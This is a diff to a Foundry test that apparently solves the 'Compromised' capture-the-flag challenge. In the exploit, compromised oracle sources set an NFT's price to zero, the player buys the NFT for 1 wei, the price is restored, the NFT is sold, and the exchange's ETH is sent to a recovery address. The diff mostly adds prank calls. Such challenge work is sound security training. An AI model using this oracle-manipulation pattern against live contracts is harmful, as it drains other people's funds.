@@ -88,8 +88,9 @@ contract CompromisedChallenge is Test {
         oracle.postPrice("DVNFT", 0);
         vm.stopPrank();
         
+        vm.startPrank(player);
         uint256 nftId = exchange.buyOne{value: 1 wei}();
-      
+
         nft.approve(address(exchange), nftId);
         vm.stopPrank();
 
@@ -100,10 +101,12 @@ contract CompromisedChallenge is Test {
         vm.startPrank(source2);
         oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         vm.stopPrank();
-        
+
+        vm.startPrank(player);
         exchange.sellOne(nftId);
         
         payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
 
         //this is why the exploit works: TrustfulOracle contract allow anyone who have TRUSTED_SOURCE_ROLE to call postPrice()
     }
